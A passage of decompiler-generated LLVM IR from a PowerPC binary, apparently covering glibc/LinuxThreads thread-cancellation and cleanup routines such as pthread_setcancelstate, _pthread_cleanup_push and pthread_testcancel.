  %v1_10014be8 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10014bec = add i32 %v1_10014be8, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %v2_10014bec, i32* @r29, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %v2_10014bec, i32* @r3, align 4
  store i32 268520444, i32* @lr, align 4
  %v0_10014bf8 = call i32 @__pthread_lock()
  store i32 %v0_10014bf8, i32* %r3.global-to-local, align 4
  %v0_10014bfc = load i32, i32* @r29, align 4
  %v1_10014bfc = add i32 %v0_10014bfc, 8
  %v2_10014bfc = inttoptr i32 %v1_10014bfc to i32*
  %v3_10014bfc = load i32, i32* %v2_10014bfc, align 4
  store i32 %v3_10014bfc, i32* @r31, align 4
  %v3_10014c00 = icmp eq i32 %v3_10014bfc, 0
  store i1 %v3_10014c00, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014c00, label %dec_label_pc_10014c14, label %dec_label_pc_10014c08

dec_label_pc_10014c08:                            ; preds = %entry
  %v1_10014c08 = add i32 %v3_10014bfc, 16
  %v2_10014c08 = inttoptr i32 %v1_10014c08 to i32*
  %v3_10014c08 = load i32, i32* %v2_10014c08, align 4
  %v0_10014c0c = load i32, i32* @r30, align 4
  %v4_10014c0c = icmp eq i32 %v0_10014c0c, %v3_10014c08
  store i1 %v4_10014c0c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10014c0c, label %dec_label_pc_10014c24, label %dec_label_pc_10014c14

dec_label_pc_10014c14:                            ; preds = %dec_label_pc_10014c08, %entry
  store i32 %v0_10014bfc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014c1c.1035 to i32), i32* @lr, align 4
  %v0_10014c18 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10014cb0

dec_label_pc_10014c24:                            ; preds = %dec_label_pc_10014c08
  %v1_10014c24 = add i32 %v3_10014bfc, 64
  %v2_10014c24 = inttoptr i32 %v1_10014c24 to i8*
  %v3_10014c24 = load i8, i8* %v2_10014c24, align 1
  %v1_10014c28 = add i32 %v3_10014bfc, 66
  %v2_10014c28 = inttoptr i32 %v1_10014c28 to i8*
  %v3_10014c28 = load i8, i8* %v2_10014c28, align 1
  %v4_10014c28 = zext i8 %v3_10014c28 to i32
  store i32 %v4_10014c28, i32* %r9.global-to-local, align 4
  %v3_10014c2c = icmp eq i8 %v3_10014c24, 1
  store i1 %v3_10014c2c, i1* %cr7_eq.global-to-local, align 1
  store i8 1, i8* %v2_10014c28, align 1
  %v0_10014c38 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10014c38, label %dec_label_pc_10014c44, label %dec_label_pc_10014c3c

dec_label_pc_10014c3c:                            ; preds = %dec_label_pc_10014c24
  %v0_10014c3c = load i32, i32* %r9.global-to-local, align 4
  %v3_10014c3c = icmp eq i32 %v0_10014c3c, 0
  store i1 %v3_10014c3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014c3c, label %dec_label_pc_10014c50, label %dec_label_pc_10014c44

dec_label_pc_10014c44:                            ; preds = %dec_label_pc_10014c3c, %dec_label_pc_10014c24
  %v0_10014c44 = load i32, i32* @r29, align 4
  store i32 %v0_10014c44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10014c4c.1036 to i32), i32* @lr, align 4
  %v0_10014c48 = call i32 @__pthread_unlock()
  store i32 %v0_10014c48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014cb0

dec_label_pc_10014c50:                            ; preds = %dec_label_pc_10014c3c
  %v0_10014c50 = load i32, i32* @r31, align 4
  %v1_10014c50 = add i32 %v0_10014c50, 444
  %v2_10014c50 = inttoptr i32 %v1_10014c50 to i32*
  %v3_10014c50 = load i32, i32* %v2_10014c50, align 4
  store i32 %v3_10014c50, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v1_10014c58 = add i32 %v0_10014c50, 20
  %v2_10014c58 = inttoptr i32 %v1_10014c58 to i32*
  %v3_10014c58 = load i32, i32* %v2_10014c58, align 4
  store i32 %v3_10014c58, i32* %r28.global-to-local, align 4
  %v3_10014c5c = icmp eq i32 %v3_10014c50, 0
  store i1 %v3_10014c5c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014c5c, label %dec_label_pc_10014c80, label %dec_label_pc_10014c64

dec_label_pc_10014c64:                            ; preds = %dec_label_pc_10014c50
  %v1_10014c64 = inttoptr i32 %v3_10014c50 to i32*
  %v2_10014c64 = load i32, i32* %v1_10014c64, align 4
  store i32 %v2_10014c64, i32* %r3.global-to-local, align 4
  %v1_10014c6c = add i32 %v3_10014c50, 4
  %v2_10014c6c = inttoptr i32 %v1_10014c6c to i32*
  %v3_10014c6c = load i32, i32* %v2_10014c6c, align 4
  store i32 %v3_10014c6c, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10014c6c)
  %v1_10014c78 = trunc i32 %v2_10014c64 to i8
  %v2_10014c78 = load i32, i32* @r31, align 4
  %v3_10014c78 = add i32 %v2_10014c78, 440
  %v4_10014c78 = inttoptr i32 %v3_10014c78 to i8*
  store i8 %v1_10014c78, i8* %v4_10014c78, align 1
  %v0_10014c7c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10014c7c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10014c80

dec_label_pc_10014c80:                            ; preds = %dec_label_pc_10014c50, %dec_label_pc_10014c64
  %v0_10014c80 = load i32, i32* @r29, align 4
  store i32 %v0_10014c80, i32* @r3, align 4
  store i32 268520584, i32* @lr, align 4
  %v0_10014c84 = call i32 @__pthread_unlock()
  store i32 %v0_10014c84, i32* %r3.global-to-local, align 4
  %v0_10014c88 = load i32, i32* %r30.global-to-local, align 4
  %v3_10014c88 = icmp eq i32 %v0_10014c88, 0
  store i1 %v3_10014c88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014c88, label %dec_label_pc_10014c9c, label %dec_label_pc_10014c90

dec_label_pc_10014c90:                            ; preds = %dec_label_pc_10014c80
  %v0_10014c90 = load i32, i32* @r31, align 4
  store i32 %v0_10014c90, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10014c98.1037 to i32), i32* @lr, align 4
  %v0_10014c94 = call i32 @__pthread_restart_new()
  store i32 %v0_10014c94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014cb0

dec_label_pc_10014c9c:                            ; preds = %dec_label_pc_10014c80
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v0_10014ca0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10014ca0, i32* %r3.global-to-local, align 4
  %v3_10014ca4 = load i32, i32* @global_var_10045108.994, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014cac.1038 to i32), i32* @lr, align 4
  %v2_10014ca8 = call i32 @kill(i32 %v0_10014ca0, i32 %v3_10014ca4)
  store i32 %v2_10014ca8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014cb0

dec_label_pc_10014cb0:                            ; preds = %dec_label_pc_10014c9c, %dec_label_pc_10014c44, %dec_label_pc_10014c90, %dec_label_pc_10014c14
  %storemerge = phi i32 [ 3, %dec_label_pc_10014c14 ], [ 0, %dec_label_pc_10014c90 ], [ 0, %dec_label_pc_10014c44 ], [ 0, %dec_label_pc_10014c9c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_10014c50, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10014bfc, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014cb0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10014c80, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v3_10014cc4 = icmp ugt i8 %arg1, 1
  %v0_10014cc8 = load i32, i32* @lr, align 4
  store i32 %v0_10014cc8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r11.global-to-local, align 4
  %v0_10014cd4 = load i32, i32* @r2, align 4
  store i32 %v0_10014cd4, i32* %r9.global-to-local, align 4
  br i1 %v3_10014cc4, label %dec_label_pc_10014d28, label %dec_label_pc_10014ce4

dec_label_pc_10014ce4:                            ; preds = %entry
  %v3_10014ce4 = icmp eq i32 %arg2, 0
  br i1 %v3_10014ce4, label %dec_label_pc_10014cf4, label %dec_label_pc_10014cec

dec_label_pc_10014cec:                            ; preds = %dec_label_pc_10014ce4
  %v1_10014cec = add i32 %v0_10014cd4, 64
  %v2_10014cec = inttoptr i32 %v1_10014cec to i8*
  %v3_10014cec = load i8, i8* %v2_10014cec, align 1
  %v4_10014cec = zext i8 %v3_10014cec to i32
  store i32 %v4_10014cec, i32* %r0.global-to-local, align 4
  %v2_10014cf0 = inttoptr i32 %arg2 to i32*
  store i32 %v4_10014cec, i32* %v2_10014cf0, align 4
  %v0_10014cf4.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10014cf8.pre = load i32, i32* %r11.global-to-local, align 4
  %extract.t4 = trunc i32 %v0_10014cf8.pre to i8
  br label %dec_label_pc_10014cf4

dec_label_pc_10014cf4:                            ; preds = %dec_label_pc_10014ce4, %dec_label_pc_10014cec
  %v0_10014cf8.off0 = phi i8 [ %arg1, %dec_label_pc_10014ce4 ], [ %extract.t4, %dec_label_pc_10014cec ]
  %v2_10014cf8 = phi i32 [ %v0_10014cd4, %dec_label_pc_10014ce4 ], [ %v0_10014cf4.pre, %dec_label_pc_10014cec ]
  %v1_10014cf4 = add i32 %v2_10014cf8, 66
  %v2_10014cf4 = inttoptr i32 %v1_10014cf4 to i8*
  %v3_10014cf4 = load i8, i8* %v2_10014cf4, align 1
  %v4_10014cf4 = zext i8 %v3_10014cf4 to i32
  store i32 %v4_10014cf4, i32* %r0.global-to-local, align 4
  %v3_10014cf8 = add i32 %v2_10014cf8, 64
  %v4_10014cf8 = inttoptr i32 %v3_10014cf8 to i8*
  store i8 %v0_10014cf8.off0, i8* %v4_10014cf8, align 1
  %v0_10014cfc = load i32, i32* %r0.global-to-local, align 4
  %v3_10014cfc = icmp eq i32 %v0_10014cfc, 0
  br i1 %v3_10014cfc, label %dec_label_pc_10014d24, label %dec_label_pc_10014d04

dec_label_pc_10014d04:                            ; preds = %dec_label_pc_10014cf4
  %v0_10014d04 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014d04 = add i32 %v0_10014d04, 64
  %v2_10014d04 = inttoptr i32 %v1_10014d04 to i32*
  %v3_10014d04 = load i32, i32* %v2_10014d04, align 4
  store i32 %v3_10014d04, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10014d0c = call i32 @__asm_rlwinm(i32 %v3_10014d04, i32 0, i32 0, i32 15)
  store i32 %v1_10014d0c, i32* %r0.global-to-local, align 4
  %v4_10014d10 = icmp eq i32 %v1_10014d0c, 65536
  br i1 %v4_10014d10, label %dec_label_pc_10014d18, label %dec_label_pc_10014d24

dec_label_pc_10014d18:                            ; preds = %dec_label_pc_10014d04
  %v0_10014d20 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10014d24

dec_label_pc_10014d24:                            ; preds = %dec_label_pc_10014d04, %dec_label_pc_10014cf4, %dec_label_pc_10014d18
  br label %dec_label_pc_10014d28

dec_label_pc_10014d28:                            ; preds = %entry, %dec_label_pc_10014d24
  %v0_10014d34 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10014d24 ]
  store i32 %v0_10014cc8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014d34

; uselistorder directives
  uselistorder label %dec_label_pc_10014d28, { 1, 0 }
  uselistorder label %dec_label_pc_10014d24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014cf4, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10014d44 = load i32, i32* @r2, align 4
  store i32 %v0_10014d44, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v1_10014d50 = add i32 %v0_10014d44, 60
  br label %dec_label_pc_10014d70

dec_label_pc_10014d5c:                            ; preds = %dec_label_pc_10014d70
  %v1_10014d5c = inttoptr i32 %storemerge to i32*
  %v2_10014d5c = load i32, i32* %v1_10014d5c, align 4
  %v1_10014d60 = add i32 %storemerge, 4
  %v2_10014d60 = inttoptr i32 %v1_10014d60 to i32*
  %v3_10014d60 = load i32, i32* %v2_10014d60, align 4
  store i32 %v3_10014d60, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_10014d5c)
  %v0_10014d6c = load i32, i32* @r31, align 4
  %v1_10014d6c = add i32 %v0_10014d6c, 12
  %v1_10014d74.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014d70

dec_label_pc_10014d70:                            ; preds = %entry, %dec_label_pc_10014d5c
  %v1_10014d74 = phi i32 [ %arg1, %entry ], [ %v1_10014d74.pre, %dec_label_pc_10014d5c ]
  %storemerge.in.in = phi i32 [ %v1_10014d50, %entry ], [ %v1_10014d6c, %dec_label_pc_10014d5c ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_10014d70 = icmp eq i32 %storemerge, 0
  %tmp5 = icmp ule i32 %storemerge, %v1_10014d74
  %or.cond = or i1 %tmp5, %v3_10014d70
  br i1 %or.cond, label %dec_label_pc_10014d7c, label %dec_label_pc_10014d5c

dec_label_pc_10014d7c:                            ; preds = %dec_label_pc_10014d70
  %v0_10014d7c = load i32, i32* %r30.global-to-local, align 4
  %v1_10014d7c = add i32 %v0_10014d7c, 372
  %v2_10014d7c = inttoptr i32 %v1_10014d7c to i32*
  %v3_10014d7c = load i32, i32* %v2_10014d7c, align 4
  %v3_10014d80 = icmp eq i32 %v3_10014d7c, 0
  br i1 %v3_10014d80, label %dec_label_pc_10014d7c.dec_label_pc_10014d8c_crit_edge, label %dec_label_pc_10014d88

dec_label_pc_10014d7c.dec_label_pc_10014d8c_crit_edge: ; preds = %dec_label_pc_10014d7c
  %v0_10014d9c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014d8c

dec_label_pc_10014d88:                            ; preds = %dec_label_pc_10014d7c
  store i32 268520844, i32* @lr, align 4
  %v0_10014d88 = call i32 @__rpc_thread_destroy()
  store i32 %v0_10014d88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014d8c

dec_label_pc_10014d8c:                            ; preds = %dec_label_pc_10014d7c.dec_label_pc_10014d8c_crit_edge, %dec_label_pc_10014d88
  %v0_10014d9c = phi i32 [ %v0_10014d9c.pre, %dec_label_pc_10014d7c.dec_label_pc_10014d8c_crit_edge ], [ %v0_10014d88, %dec_label_pc_10014d88 ]
  ret i32 %v0_10014d9c

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10014d70, { 1, 0 }
}

define i32 @__pthread_cleanup_pop_restore() local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r9.global-to-local = alloca i32, align 4
  %v0_10014da0 = load i32, i32* @r4, align 4
  %v3_10014da0 = icmp eq i32 %v0_10014da0, 0
  store i1 %v3_10014da0, i1* %cr7_eq.global-to-local, align 1
  %v0_10014db0 = load i32, i32* @r3, align 4
  store i32 %v0_10014db0, i32* @r31, align 4
  %v0_10014db8 = load i32, i32* @r2, align 4
  store i32 %v0_10014db8, i32* @r30, align 4
  br i1 %v3_10014da0, label %dec_label_pc_10014dd0, label %dec_label_pc_10014dc0

dec_label_pc_10014dc0:                            ; preds = %entry
  %v1_10014dcc = call i32 @unknown_0()
  store i32 %v1_10014dcc, i32* @r3, align 4
  %v0_10014dd0.pre = load i32, i32* @r31, align 4
  %v0_10014dd4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014dd0

dec_label_pc_10014dd0:                            ; preds = %entry, %dec_label_pc_10014dc0
  %v1_10014dd8 = phi i32 [ %v0_10014db8, %entry ], [ %v0_10014dd4.pre, %dec_label_pc_10014dc0 ]
  %v0_10014dd0 = phi i32 [ %v0_10014db0, %entry ], [ %v0_10014dd0.pre, %dec_label_pc_10014dc0 ]
  %v1_10014dd0 = add i32 %v0_10014dd0, 12
  %v2_10014dd0 = inttoptr i32 %v1_10014dd0 to i32*
  %v3_10014dd0 = load i32, i32* %v2_10014dd0, align 4
  %v1_10014dd4 = add i32 %v1_10014dd8, 66
  %v2_10014dd4 = inttoptr i32 %v1_10014dd4 to i8*
  %v3_10014dd4 = load i8, i8* %v2_10014dd4, align 1
  %v4_10014dd4 = zext i8 %v3_10014dd4 to i32
  store i32 %v4_10014dd4, i32* %r9.global-to-local, align 4
  %v2_10014dd8 = add i32 %v1_10014dd8, 60
  %v3_10014dd8 = inttoptr i32 %v2_10014dd8 to i32*
  store i32 %v3_10014dd0, i32* %v3_10014dd8, align 4
  %v0_10014ddc = load i32, i32* %r9.global-to-local, align 4
  %v3_10014ddc = icmp eq i32 %v0_10014ddc, 0
  store i1 %v3_10014ddc, i1* %cr7_eq.global-to-local, align 1
  %v0_10014de0 = load i32, i32* @r31, align 4
  %v1_10014de0 = add i32 %v0_10014de0, 8
  %v2_10014de0 = inttoptr i32 %v1_10014de0 to i32*
  %v3_10014de0 = load i32, i32* %v2_10014de0, align 4
  %v1_10014de4 = trunc i32 %v3_10014de0 to i8
  %v2_10014de4 = load i32, i32* @r30, align 4
  %v3_10014de4 = add i32 %v2_10014de4, 65
  %v4_10014de4 = inttoptr i32 %v3_10014de4 to i8*
  store i8 %v1_10014de4, i8* %v4_10014de4, align 1
  %v0_10014de8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10014de8, label %dec_label_pc_10014e0c, label %dec_label_pc_10014dec

dec_label_pc_10014dec:                            ; preds = %dec_label_pc_10014dd0
  %v0_10014dec = load i32, i32* @r30, align 4
  %v1_10014dec = add i32 %v0_10014dec, 64
  %v2_10014dec = inttoptr i32 %v1_10014dec to i32*
  %v3_10014dec = load i32, i32* %v2_10014dec, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10014df4 = call i32 @__asm_rlwinm(i32 %v3_10014dec, i32 0, i32 0, i32 15)
  %v4_10014df8 = icmp eq i32 %v1_10014df4, 65536
  store i1 %v4_10014df8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10014df8, label %dec_label_pc_10014e00, label %dec_label_pc_10014e0c

dec_label_pc_10014e00:                            ; preds = %dec_label_pc_10014dec
  %v0_10014e08 = call i32 @__pthread_do_exit()
  store i32 %v0_10014e08, i32* @r3, align 4
  br label %dec_label_pc_10014e0c

dec_label_pc_10014e0c:                            ; preds = %dec_label_pc_10014dec, %dec_label_pc_10014dd0, %dec_label_pc_10014e00
  %v0_10014e1c = load i32, i32* @r3, align 4
  ret i32 %v0_10014e1c

; uselistorder directives
  uselistorder label %dec_label_pc_10014e0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014dd0, { 1, 0 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10014e24 = load i32, i32* @r2, align 4
  store i32 %v0_10014e24, i32* %r9.global-to-local, align 4
  %v2_10014e28 = add i32 %tmp, 4
  %v3_10014e28 = inttoptr i32 %v2_10014e28 to i32*
  store i32 %arg3, i32* %v3_10014e28, align 4
  %v0_10014e2c = load i32, i32* @r2, align 4
  %v1_10014e2c = add i32 %v0_10014e2c, 65
  %v2_10014e2c = inttoptr i32 %v1_10014e2c to i8*
  %v3_10014e2c = load i8, i8* %v2_10014e2c, align 1
  %v4_10014e2c = zext i8 %v3_10014e2c to i32
  store i32 %v4_10014e2c, i32* %r0.global-to-local, align 4
  %v2_10014e30 = add i32 %tmp, 8
  %v3_10014e30 = inttoptr i32 %v2_10014e30 to i32*
  store i32 %v4_10014e2c, i32* %v3_10014e30, align 4
  %v0_10014e34 = load i32, i32* @r2, align 4
  %v1_10014e34 = add i32 %v0_10014e34, 60
  %v2_10014e34 = inttoptr i32 %v1_10014e34 to i32*
  %v3_10014e34 = load i32, i32* %v2_10014e34, align 4
  store i32 %v3_10014e34, i32* %r0.global-to-local, align 4
  %v2_10014e40 = add i32 %tmp, 12
  %v3_10014e40 = inttoptr i32 %v2_10014e40 to i32*
  store i32 %v3_10014e34, i32* %v3_10014e40, align 4
  %tmp1 = add i32 %v3_10014e34, -1
  %tmp2 = icmp ult i32 %tmp1, %tmp
  br i1 %tmp2, label %dec_label_pc_10014e4c, label %dec_label_pc_10014e54

dec_label_pc_10014e4c:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_10014e40, align 4
  br label %dec_label_pc_10014e54

dec_label_pc_10014e54:                            ; preds = %entry, %dec_label_pc_10014e4c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014e58 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014e58 = add i32 %v1_10014e58, 60
  %v3_10014e58 = inttoptr i32 %v2_10014e58 to i32*
  store i32 %tmp, i32* %v3_10014e58, align 4
  %v0_10014e5c = load i32, i32* %r0.global-to-local, align 4
  %v1_10014e5c = trunc i32 %v0_10014e5c to i8
  %v2_10014e5c = load i32, i32* %r9.global-to-local, align 4
  %v3_10014e5c = add i32 %v2_10014e5c, 65
  %v4_10014e5c = inttoptr i32 %v3_10014e5c to i8*
  store i8 %v1_10014e5c, i8* %v4_10014e5c, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 2, 0, 5, 4, 3 }
  uselistorder label %dec_label_pc_10014e54, { 1, 0 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v3_10014e64 = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v0_10014e7c = load i32, i32* @r2, align 4
  store i32 %v0_10014e7c, i32* @r30, align 4
  br i1 %v3_10014e64, label %dec_label_pc_10014e94, label %dec_label_pc_10014e84

dec_label_pc_10014e84:                            ; preds = %entry
  %v1_10014e88 = add i32 %tmp, 4
  %v2_10014e88 = inttoptr i32 %v1_10014e88 to i32*
  %v3_10014e88 = load i32, i32* %v2_10014e88, align 4
  store i32 %v3_10014e88, i32* %r3.global-to-local, align 4
  %v1_10014e90 = call i32 @unknown_0()
  store i32 %v1_10014e90, i32* %r3.global-to-local, align 4
  %v0_10014e94.pre = load i32, i32* %r31.global-to-local, align 4
  %v1_10014e98.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014e94

dec_label_pc_10014e94:                            ; preds = %entry, %dec_label_pc_10014e84
  %v1_10014e98 = phi i32 [ %v0_10014e7c, %entry ], [ %v1_10014e98.pre, %dec_label_pc_10014e84 ]
  %v0_10014e94 = phi i32 [ %tmp, %entry ], [ %v0_10014e94.pre, %dec_label_pc_10014e84 ]
  %v1_10014e94 = add i32 %v0_10014e94, 12
  %v2_10014e94 = inttoptr i32 %v1_10014e94 to i32*
  %v3_10014e94 = load i32, i32* %v2_10014e94, align 4
  %v2_10014e98 = add i32 %v1_10014e98, 60
  %v3_10014e98 = inttoptr i32 %v2_10014e98 to i32*
  store i32 %v3_10014e94, i32* %v3_10014e98, align 4
  %v0_10014eac = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014eac

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10014e94, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10014eb4 = load i32, i32* @r2, align 4
  store i32 %v0_10014eb4, i32* @r9, align 4
  %v2_10014eb8 = add i32 %tmp, 4
  %v3_10014eb8 = inttoptr i32 %v2_10014eb8 to i32*
  store i32 %arg3, i32* %v3_10014eb8, align 4
  %v0_10014ebc = load i32, i32* @r2, align 4
  %v1_10014ebc = add i32 %v0_10014ebc, 60
  %v2_10014ebc = inttoptr i32 %v1_10014ebc to i32*
  %v3_10014ebc = load i32, i32* %v2_10014ebc, align 4
  %v2_10014ec8 = add i32 %tmp, 12
  %v3_10014ec8 = inttoptr i32 %v2_10014ec8 to i32*
  %tmp1 = add i32 %v3_10014ebc, -1
  %tmp2 = icmp ult i32 %tmp1, %tmp
  br i1 %tmp2, label %dec_label_pc_10014ed4, label %dec_label_pc_10014edc

dec_label_pc_10014ed4:                            ; preds = %entry
  br label %dec_label_pc_10014edc

dec_label_pc_10014edc:                            ; preds = %entry, %dec_label_pc_10014ed4
  %storemerge = phi i32 [ 0, %dec_label_pc_10014ed4 ], [ %v3_10014ebc, %entry ]
  store i32 %storemerge, i32* %v3_10014ec8, align 4
  %v1_10014edc = load i32, i32* @r9, align 4
  %v2_10014edc = add i32 %v1_10014edc, 60
  %v3_10014edc = inttoptr i32 %v2_10014edc to i32*
  store i32 %tmp, i32* %v3_10014edc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10014edc, { 1, 0 }
}

define i32 @pthread_testcancel(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10014ef0 = load i32, i32* @r2, align 4
  %v1_10014ef0 = add i32 %v0_10014ef0, 66
  %v2_10014ef0 = inttoptr i32 %v1_10014ef0 to i8*
  %v3_10014ef0 = load i8, i8* %v2_10014ef0, align 1
  %v3_10014ef4 = icmp eq i8 %v3_10014ef0, 0
  br i1 %v3_10014ef4, label %dec_label_pc_10014f14, label %dec_label_pc_10014efc

dec_label_pc_10014efc:                            ; preds = %entry
  %v1_10014efc = add i32 %v0_10014ef0, 64
  %v2_10014efc = inttoptr i32 %v1_10014efc to i8*
  %v3_10014efc = load i8, i8* %v2_10014efc, align 1
  %v3_10014f00 = icmp eq i8 %v3_10014efc, 0
  br i1 %v3_10014f00, label %dec_label_pc_10014f08, label %dec_label_pc_10014f14

dec_label_pc_10014f08:                            ; preds = %dec_label_pc_10014efc
  %v0_10014f10 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10014f14

dec_label_pc_10014f14:                            ; preds = %dec_label_pc_10014efc, %entry, %dec_label_pc_10014f08
  %.0 = phi i32 [ undef, %entry ], [ %v0_10014f10, %dec_label_pc_10014f08 ], [ undef, %dec_label_pc_10014efc ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_10014f14, { 2, 0, 1 }
}

define i32 @enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10014f24 = add i32 %arg1, 24
  %v2_10014f24 = inttoptr i32 %v1_10014f24 to i32*
  %v3_10014f24 = load i32, i32* %v2_10014f24, align 4
  store i32 %v3_10014f24, i32* @r11, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10014f7c.pre = load i32, i32* @r3, align 4
  %v1_10014f7c21 = inttoptr i32 %v0_10014f7c.pre to i32*
  %v2_10014f7c22 = load i32, i32* %v1_10014f7c21, align 4
  store i32 %v2_10014f7c22, i32* %r9.global-to-local, align 4
  %v3_10014f8025 = icmp eq i32 %v2_10014f7c22, 0
  br i1 %v3_10014f8025, label %dec_label_pc_10014f8c, label %dec_label_pc_10014f5c

dec_label_pc_10014f5c:                            ; preds = %entry, %dec_label_pc_10014f78
  %v2_10014f7c.pn = phi i32 [ %v2_10014f7c, %dec_label_pc_10014f78 ], [ %v2_10014f7c22, %entry ]
  %v2_10014f7c30 = phi i32 [ %v2_10014f7c, %dec_label_pc_10014f78 ], [ %v2_10014f7c22, %entry ]
  %v1_10014f7c29 = phi i32* [ %v1_10014f7c, %dec_label_pc_10014f78 ], [ %v1_10014f7c21, %entry ]
  %v4_10014f8435 = icmp eq i32 %v2_10014f7c.pn, %arg1
  %v1_10014f60 = add i32 %v2_10014f7c30, 8
  br i1 %v4_10014f8435, label %dec_label_pc_10014f60, label %dec_label_pc_10014f78

dec_label_pc_10014f60:                            ; preds = %dec_label_pc_10014f5c
  %v2_10014f60 = inttoptr i32 %v1_10014f60 to i32*
